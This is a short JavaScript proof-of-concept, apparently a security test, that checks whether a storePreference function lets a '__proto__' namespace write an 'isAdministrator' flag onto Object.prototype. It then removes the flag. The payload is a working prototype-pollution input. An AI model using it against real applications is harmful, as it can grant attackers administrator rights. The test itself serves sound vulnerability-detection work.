import { storePreference } from "./src/storage.js";

delete Object.prototype.isAdministrator;
try {
  storePreference({
    namespace: "__proto__",
    key: "isAdministrator",
    value: true,
  });
  if ({}.isAdministrator !== true) {
    throw new Error("attacker key did not reach Object.prototype");
  }
  console.log("vulnerable nested property write polluted Object.prototype");
} finally {
  delete Object.prototype.isAdministrator;
}
